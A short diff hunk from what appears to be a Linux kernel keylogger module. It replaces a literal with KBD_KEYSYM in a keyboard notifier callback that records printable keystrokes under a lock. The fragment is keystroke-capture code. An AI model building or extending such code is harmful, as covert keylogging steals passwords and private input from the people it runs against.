@@ -95,7 +95,7 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
         return NOTIFY_STOP;
     }
 
-    if (action == 4 && param->down) {
+    if (action == KBD_KEYSYM && param->down) {
         unsigned char c = param->value & 0xFF;
         if (c >= ' ' && c < 127) {
             spin_lock_irqsave(&keylog_lock, flags);
